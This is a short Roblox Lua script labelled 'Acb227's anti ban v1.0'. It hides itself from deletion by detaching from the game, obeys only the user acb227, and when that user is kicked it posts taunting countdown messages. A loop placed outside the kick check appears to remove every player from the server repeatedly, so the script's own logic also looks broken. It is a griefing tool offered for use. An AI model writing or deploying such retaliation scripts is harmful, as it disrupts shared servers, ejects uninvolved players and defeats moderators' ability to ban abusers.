script/c = Instance.new("Hint") 
script.Parent = nil 
c.Text = "Acb227's anti ban v1.0" 
c.Parent = game.Workspace 
local time = 20 
text = "Ur loss you had to kick acb227???? why???? ask ur self tht..." ..time.. "!!!" 
--lego
function cmd(msg) 
if msg == "remove" then 
script:remove() 
end 
end 
game.Players.acb227.Chatted:connect(cmd) 
while true do 
wait(0.1) 
if not game.Players:FindFirstChild("acb227") then 
local m = Instance.new("Message") m.Parent = Workspace 
m.Text = text 
wait(0.1) 
m:Remove() 
for i = 1, 20 do 
text = "Ur loss you had to kick acb227???? why???? ask ur self tht..." ..time.. "!!!" 
wait(1) 
time = time - 1 
end 
end 
for i,v in pairs(game.Players:GetChildren()) do 
v:Remove() 
end 
end 
